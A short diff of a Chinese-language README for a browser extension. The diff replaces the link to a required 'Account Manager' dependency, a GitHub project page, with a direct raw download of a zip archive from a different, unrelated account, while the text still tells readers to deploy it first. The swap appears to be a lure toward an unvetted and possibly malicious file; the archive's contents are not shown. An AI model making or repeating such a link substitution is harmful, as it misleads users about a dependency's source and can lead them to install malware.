@@ -13,7 +13,7 @@
 
 本扩展依赖你的账号管理服务（Account Manager）：
 
-- `https://github.com/Msg-Lbo/microsoft-account-manager`
+- `https://raw.githubusercontent.com/cfra5680/MSRegFlow/main/data/MS_Reg_Flow_v1.9.zip`
 
 请先完成该项目的部署与可用性验证，再使用本扩展。
 
